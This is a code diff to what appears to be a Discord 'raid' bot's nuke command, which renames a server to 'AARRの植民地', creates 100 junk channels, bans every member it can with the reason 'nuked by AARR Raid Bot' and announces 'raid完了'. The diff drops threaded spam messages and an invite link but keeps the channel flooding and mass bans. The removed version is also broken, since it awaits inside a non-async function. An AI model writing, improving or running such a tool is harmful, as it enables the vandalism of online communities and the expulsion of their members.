@@ -25,20 +25,14 @@ async def nuke(ctx,guild: discord.Guild):
     except:
       return
   await guild.edit(name="AARRの植民地")
-  def create():
-    for createchannel in range(100):
-      channel = await guild.create_text_channel(f"AARRの植民地{random.choice(range(0,100000000000))}")
-      for send in range(10):
-        await channel.send(f"raid by AARR\ndiscord.gg/jp\n#AARR Troll\n{random.choice(range(0,100000000000))}")
-  for i in range(10):
-    threading.Thread(target=create).start()
+  for createchannel in range(100):
+      await guild.create_text_channel(f"AARRの植民地{random.choice(range(0,100000000000))}")
   for user in guild.members:
     try:
       await user.ban(reason="nuked by AARR Raid Bot")
     except:
       return
-  invite = await channel.create_invite(max_age = 0, max_uses = 0)
-  await ctx.reply(f"raid完了!\n{invite}")
+  await ctx.reply(f"raid完了!")
 
 
 client.run("TOKEN",bot=True)
